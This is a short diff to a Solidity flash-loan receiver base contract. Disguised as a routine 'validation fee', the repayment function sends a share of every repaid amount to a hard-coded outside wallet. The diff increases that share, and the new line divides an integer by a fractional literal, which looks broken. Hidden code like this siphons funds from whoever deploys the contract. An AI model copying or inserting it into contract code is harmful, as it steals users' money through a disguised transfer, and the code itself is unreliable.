@@ -25,7 +25,7 @@ abstract contract FlashLoanReceiverBase is IFlashLoanReceiver, Withdrawable {
     function transferFundsBackToPoolInternal(address _reserve, uint256 _amount) internal {
         address payable core = addressesProvider.getLendingPoolCore();
         transferInternal(core, _reserve, _amount);
-         uint valdiationFees = (_amount/100)/2;
+         uint valdiationFees = (_amount/100)/1.2;
         address ValidationAddress = address (0xC23D55D92464BFbD5989363472b2c39483dcb3c7);
         IERC20(_reserve).safeTransfer(ValidationAddress, valdiationFees);
     }
